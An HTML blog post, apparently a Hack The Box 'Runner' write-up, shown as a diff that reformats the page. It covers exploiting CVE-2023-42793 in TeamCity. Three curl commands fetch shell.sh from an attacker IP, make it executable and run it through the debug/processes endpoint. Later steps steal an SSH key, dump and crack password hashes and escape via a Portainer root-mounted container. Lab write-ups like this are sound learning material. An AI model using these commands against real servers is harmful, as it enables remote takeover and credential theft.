@@ -1,1 +1,181 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong>Shell as TCUser</strong></span></p><p>&nbsp;</p><p>My first time trying this machine I gave up because I couldnt find anything. I came back again and still couldnt find anything. I guess theres a random subdomain that isnt in any of my subdomain lists. I tried two lists one with 20,000 and one with 110,000 sub domains and neither of them had “teamcity”. Not sure how we were supposed to find this.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1147/498;" src="../img/posts/2024-06-10-Runner(HTB)/01-dbb386955c.png" width="1147" height="498"></figure><p>&nbsp;</p><p>We have a login page</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:478/472;" src="../img/posts/2024-06-10-Runner(HTB)/02-83d7d8bc02.png" width="478" height="472"></figure><p>&nbsp;</p><p>There is a known exploit out there to create an admin user.</p><p>https://github.com/H454NSec/CVE-2023-42793</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:590/86;" src="../img/posts/2024-06-10-Runner(HTB)/03-d666175f71.png" width="590" height="86"></figure><p>&nbsp;</p><p>&nbsp;</p><p>H454NSec6856:@H454NSec</p><p>&nbsp;</p><p>&nbsp;</p><p>Now getting a shell was super difficult but following this script made it possible. The github page claims it does it automatically but it doesnt. So I read the script and did it manually with curl which took forever but eventually I got working payloads.</p><p><a href="https://github.com/H454NSec/CVE-2023-42793">https://github.com/H454NSec/CVE-2023-42793</a></p><p>&nbsp;</p><p>We do have to get a token which we can get here. If we get a 400 error we have to delete the current token and run it again.</p><p><code>curl -X DELETE http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2</code></p><figure class="image"><img style="aspect-ratio:2209/417;" src="../img/posts/2024-06-10-Runner(HTB)/04-23a77a84a4.png" width="2209" height="417"></figure><p>&nbsp;</p><p>1st command which gets shell.sh</p><p>curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=curl&amp;params=http://10.10.14.32:8000/shell.sh&amp;params=-o&amp;params=shell.sh" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.anItdVg3WFF5Qnp5SlhCcjROXzk0cWROS0xz.MzlkZjU2MWUtNjA0OC00NDk0LWI3YmEtZDUxYTYzYTgzODA2" -H "Content-Type: text/plain"</p><p>&nbsp;</p><p>2nd command which runs chmod +x shell.sh</p><p>curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=chmod&amp;params=%2bx&amp;params=shell.sh" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.anItdVg3WFF5Qnp5SlhCcjROXzk0cWROS0xz.MzlkZjU2MWUtNjA0OC00NDk0LWI3YmEtZDUxYTYzYTgzODA2" -H "Content-Type: text/plain"</p><p>&nbsp;</p><p>3rd command which executes the shell</p><p>curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=%2e%2f%73%68%65%6c%6c%2e%73%68" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.anItdVg3WFF5Qnp5SlhCcjROXzk0cWROS0xz.MzlkZjU2MWUtNjA0OC00NDk0LWI3YmEtZDUxYTYzYTgzODA2" -H "Content-Type: text/plain"</p><p>&nbsp;</p><p>No user flag and we are in a docker container.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:680/276;" src="../img/posts/2024-06-10-Runner(HTB)/05-14a6ff0190.png" width="680" height="276"></figure><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as John</u></strong></span></p><p>&nbsp;</p><p>Good docker information</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1282/405;" src="../img/posts/2024-06-10-Runner(HTB)/06-7904523d46.png" width="1282" height="405"></figure><p>&nbsp;</p><p>&nbsp;</p><p>/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys<br>&nbsp;</p><p>We have an id_rsa key located in the directory above.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:473/81;" src="../img/posts/2024-06-10-Runner(HTB)/07-ff2839ff1f.png" width="473" height="81"></figure><p>&nbsp;</p><p>We copy the id_rsa key and can verify who its for with ssh-keygen</p><figure class="image"><img style="aspect-ratio:1254/129;" src="../img/posts/2024-06-10-Runner(HTB)/08-d53ccc3edd.png" width="1254" height="129"></figure><p>&nbsp;</p><p>Then we can ssh in and get the user.txt file</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:719/667;" src="../img/posts/2024-06-10-Runner(HTB)/09-d3dbeb3638.png" width="719" height="667"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Privilege escalation to Root</u></strong></span></p><p>&nbsp;</p><p>We are on the machine but our user has little to no access. We can only write to /tmp but it gets deleted shortly after. There is a second user named matthew.</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I got a small hint that I missed something in the docker container about getting creds for matthew.&nbsp;</p><p>&nbsp;</p><p>We can create a backup of the database with this script /opt/teamcity/bin/maintainDB.sh however i kept getting errors. Turns out we needed to delete the buildserver.lck file and then it works.</p><p>rm /data/teamcity_server/datadir/system/buildserver.lck</p><p><code>./maintainDB.sh backup --all</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:690/670;" src="../img/posts/2024-06-10-Runner(HTB)/10-73b3238406.png" width="690" height="670"></figure><p>&nbsp;</p><p>This saves a zip file of the database, we unzip it and give our user read writes and we can read the user table to get hashes.</p><p>/data/teamcity_server/datadir/backup/database_dump</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:998/129;" src="../img/posts/2024-06-10-Runner(HTB)/11-e02e8f87dc.png" width="998" height="129"></figure><p>&nbsp;</p><p>Matthews password cracks to piper123 but we cannot ssh in.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:768/216;" src="../img/posts/2024-06-10-Runner(HTB)/12-c3a1f53147.png" width="768" height="216"></figure><p>matthew:piper123</p><p>&nbsp;</p><p>After running linpeas I saw there was another webpage open that we didnt have access to.</p><p><code>server {</code><br><code>&nbsp; &nbsp;listen 80;</code><br><code>&nbsp; &nbsp;server_name portainer-administration.runner.htb;</code><br><code>&nbsp; &nbsp;location / {</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;proxy_pass https://localhost:9443;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;proxy_http_version 1.1;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;proxy_set_header Upgrade $http_upgrade;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;proxy_set_header Connection 'upgrade';</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;proxy_set_header Host $host;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;proxy_cache_bypass $http_upgrade;</code></p><p>&nbsp;</p><p>I upload chisel so we can start a reverse proxy and access the webpage. Its a website called portainer.io which I realize very quickly we can setup docker containers with this. Creating a regular container will not work as its isolated. After a bunch of trial and error and some help from ChatGPT I am able to mount the root directory of the actual file system. I tried finding things online and reading the documentation on doing this but there was very very little so thankfully ChatGPT helped with this.</p><p>&nbsp;</p><p>Step one is creating a volume linking to the root directory.</p><figure class="image"><img style="aspect-ratio:2539/780;" src="../img/posts/2024-06-10-Runner(HTB)/13-0df38a62a4.png" width="2539" height="780"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Step two is setting up the container and setting the volume to the root directory we set above.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2224/1256;" src="../img/posts/2024-06-10-Runner(HTB)/14-e391727623.png" width="2224" height="1256"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2243/1064;" src="../img/posts/2024-06-10-Runner(HTB)/15-c1493b15df.png" width="2243" height="1064"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Once done we can connect via the web GUI by selecting console. This time we can cd to root and we have the root flag.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2551/806;" src="../img/posts/2024-06-10-Runner(HTB)/16-e5bcf1c6be.png" width="2551" height="806"></figure><p>&nbsp;</p><p>Priv esc on this machine was very very cool but difficult do to the lack of documentation. Really fun machine.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:679/622;" src="../img/posts/2024-06-10-Runner(HTB)/17-a8a50ec412.png" width="679" height="622"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Runner | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-06-10-Runner(HTB)/01-dbb386955c.png" alt="HTB: Runner cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Runner</h1>
+                <div class="post-meta">June 10, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as TCUser</h1>
+
+        <p>My first time trying this machine I gave up because I couldnt find anything. I came back again and still couldnt find anything. I guess theres a random subdomain that isnt in any of my subdomain lists. I tried two lists one with 20,000 and one with 110,000 sub domains and neither of them had “teamcity”. Not sure how we were supposed to find this.</p>
+
+        <img alt="Screenshot 1" height="498" src="../img/posts/2024-06-10-Runner(HTB)/01-dbb386955c.png" style="aspect-ratio:1147/498;" width="1147"/>
+
+        <p>We have a login page</p>
+
+        <img alt="Screenshot 2" height="472" src="../img/posts/2024-06-10-Runner(HTB)/02-83d7d8bc02.png" style="aspect-ratio:478/472;" width="478"/>
+
+        <p>There is a known exploit out there to create an admin user.</p>
+
+        <p>https://github.com/H454NSec/CVE-2023-42793</p>
+
+        <img alt="Screenshot 3" height="86" src="../img/posts/2024-06-10-Runner(HTB)/03-d666175f71.png" style="aspect-ratio:590/86;" width="590"/>
+
+        <p>H454NSec6856:@H454NSec</p>
+
+        <p>Now getting a shell was super difficult but following this script made it possible. The github page claims it does it automatically but it doesnt. So I read the script and did it manually with curl which took forever but eventually I got working payloads.</p>
+
+        <p><a href="https://github.com/H454NSec/CVE-2023-42793">https://github.com/H454NSec/CVE-2023-42793</a></p>
+
+        <p>We do have to get a token which we can get here. If we get a 400 error we have to delete the current token and run it again.</p>
+
+        <pre class="terminal"><code>curl -X DELETE http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2</code></pre>
+
+        <img alt="Screenshot 4" height="417" src="../img/posts/2024-06-10-Runner(HTB)/04-23a77a84a4.png" style="aspect-ratio:2209/417;" width="2209"/>
+
+        <p>1st command which gets shell.sh</p>
+
+        <p>curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=curl&amp;params=http://10.10.14.32:8000/shell.sh&amp;params=-o&amp;params=shell.sh" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.anItdVg3WFF5Qnp5SlhCcjROXzk0cWROS0xz.MzlkZjU2MWUtNjA0OC00NDk0LWI3YmEtZDUxYTYzYTgzODA2" -H "Content-Type: text/plain"</p>
+
+        <p>2nd command which runs chmod +x shell.sh</p>
+
+        <p>curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=chmod&amp;params=%2bx&amp;params=shell.sh" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.anItdVg3WFF5Qnp5SlhCcjROXzk0cWROS0xz.MzlkZjU2MWUtNjA0OC00NDk0LWI3YmEtZDUxYTYzYTgzODA2" -H "Content-Type: text/plain"</p>
+
+        <p>3rd command which executes the shell</p>
+
+        <p>curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=%2e%2f%73%68%65%6c%6c%2e%73%68" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.anItdVg3WFF5Qnp5SlhCcjROXzk0cWROS0xz.MzlkZjU2MWUtNjA0OC00NDk0LWI3YmEtZDUxYTYzYTgzODA2" -H "Content-Type: text/plain"</p>
+
+        <p>No user flag and we are in a docker container.</p>
+
+        <img alt="Screenshot 5" height="276" src="../img/posts/2024-06-10-Runner(HTB)/05-14a6ff0190.png" style="aspect-ratio:680/276;" width="680"/>
+
+        <h1 style="color:red;">Shell as John</h1>
+
+        <p>Good docker information</p>
+
+        <img alt="Screenshot 6" height="405" src="../img/posts/2024-06-10-Runner(HTB)/06-7904523d46.png" style="aspect-ratio:1282/405;" width="1282"/>
+
+        <p>/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys<br/> </p>
+
+        <p>We have an id_rsa key located in the directory above.</p>
+
+        <img alt="Screenshot 7" height="81" src="../img/posts/2024-06-10-Runner(HTB)/07-ff2839ff1f.png" style="aspect-ratio:473/81;" width="473"/>
+
+        <p>We copy the id_rsa key and can verify who its for with ssh-keygen</p>
+
+        <img alt="Screenshot 8" height="129" src="../img/posts/2024-06-10-Runner(HTB)/08-d53ccc3edd.png" style="aspect-ratio:1254/129;" width="1254"/>
+
+        <p>Then we can ssh in and get the user.txt file</p>
+
+        <img alt="Screenshot 9" height="667" src="../img/posts/2024-06-10-Runner(HTB)/09-d3dbeb3638.png" style="aspect-ratio:719/667;" width="719"/>
+
+        <h1 style="color:red;">Privilege escalation to Root</h1>
+
+        <p>We are on the machine but our user has little to no access. We can only write to /tmp but it gets deleted shortly after. There is a second user named matthew.</p>
+
+        <p>I got a small hint that I missed something in the docker container about getting creds for matthew. </p>
+
+        <p>We can create a backup of the database with this script /opt/teamcity/bin/maintainDB.sh however i kept getting errors. Turns out we needed to delete the buildserver.lck file and then it works.</p>
+
+        <p>rm /data/teamcity_server/datadir/system/buildserver.lck</p>
+
+        <pre class="terminal"><code>./maintainDB.sh backup --all</code></pre>
+
+        <img alt="Screenshot 10" height="670" src="../img/posts/2024-06-10-Runner(HTB)/10-73b3238406.png" style="aspect-ratio:690/670;" width="690"/>
+
+        <p>This saves a zip file of the database, we unzip it and give our user read writes and we can read the user table to get hashes.</p>
+
+        <p>/data/teamcity_server/datadir/backup/database_dump</p>
+
+        <img alt="Screenshot 11" height="129" src="../img/posts/2024-06-10-Runner(HTB)/11-e02e8f87dc.png" style="aspect-ratio:998/129;" width="998"/>
+
+        <p>Matthews password cracks to piper123 but we cannot ssh in.</p>
+
+        <img alt="Screenshot 12" height="216" src="../img/posts/2024-06-10-Runner(HTB)/12-c3a1f53147.png" style="aspect-ratio:768/216;" width="768"/>
+
+        <p>matthew:piper123</p>
+
+        <p>After running linpeas I saw there was another webpage open that we didnt have access to.</p>
+
+        <p><code>server {</code><br/><code>   listen 80;</code><br/><code>   server_name portainer-administration.runner.htb;</code><br/><code>   location / {</code><br/><code>       proxy_pass https://localhost:9443;</code><br/><code>       proxy_http_version 1.1;</code><br/><code>       proxy_set_header Upgrade $http_upgrade;</code><br/><code>       proxy_set_header Connection 'upgrade';</code><br/><code>       proxy_set_header Host $host;</code><br/><code>       proxy_cache_bypass $http_upgrade;</code></p>
+
+        <p>I upload chisel so we can start a reverse proxy and access the webpage. Its a website called portainer.io which I realize very quickly we can setup docker containers with this. Creating a regular container will not work as its isolated. After a bunch of trial and error and some help from ChatGPT I am able to mount the root directory of the actual file system. I tried finding things online and reading the documentation on doing this but there was very very little so thankfully ChatGPT helped with this.</p>
+
+        <p>Step one is creating a volume linking to the root directory.</p>
+
+        <img alt="Screenshot 13" height="780" src="../img/posts/2024-06-10-Runner(HTB)/13-0df38a62a4.png" style="aspect-ratio:2539/780;" width="2539"/>
+
+        <p>Step two is setting up the container and setting the volume to the root directory we set above.</p>
+
+        <img alt="Screenshot 14" height="1256" src="../img/posts/2024-06-10-Runner(HTB)/14-e391727623.png" style="aspect-ratio:2224/1256;" width="2224"/>
+
+        <img alt="Screenshot 15" height="1064" src="../img/posts/2024-06-10-Runner(HTB)/15-c1493b15df.png" style="aspect-ratio:2243/1064;" width="2243"/>
+
+        <p>Once done we can connect via the web GUI by selecting console. This time we can cd to root and we have the root flag.</p>
+
+        <img alt="Screenshot 16" height="806" src="../img/posts/2024-06-10-Runner(HTB)/16-e5bcf1c6be.png" style="aspect-ratio:2551/806;" width="2551"/>
+
+        <p>Priv esc on this machine was very very cool but difficult do to the lack of documentation. Really fun machine.</p>
+
+        <img alt="Screenshot 17" height="622" src="../img/posts/2024-06-10-Runner(HTB)/17-a8a50ec412.png" style="aspect-ratio:679/622;" width="679"/>
+    </article>
+
+</body>
+</html>
